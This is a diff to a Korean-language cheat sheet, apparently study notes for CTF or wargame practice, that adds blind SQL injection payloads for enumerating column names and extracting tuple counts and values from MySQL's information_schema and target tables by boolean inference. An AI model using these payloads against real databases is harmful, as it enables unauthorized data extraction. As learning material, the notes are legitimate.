@@ -288,6 +288,20 @@ __select(if((table_name)in(<테이블이름>), column_name, null))from(informati
   
 - Column 이름
 
-  __if(ord(substr((select(min(if((table_name)in(<테이블 이름>),column_name,null)))from(information_schema.columns)),1,1))in(<입력>),1,0)__
+  __if(ord(substr((select(min(if((table_name)in(<테이블 이름>),column_name,null)))from(information_schema.columns)),1,1))in(<입력>),1,0)__ 
+
+<br>
+
+## Flag
+
+- 튜플 개수 - SELECT count(<컬럼>) FROM <테이블>;
+
+  __if((select(count(<컬럼>))from(<테이블>))in(<입력>),1,0)__
+
+- 튜플 값 - SELECT min/max(<컬럼>) FROM <테이블>;
+
+
+
+
 
 https://nalara12200.tistory.com/14
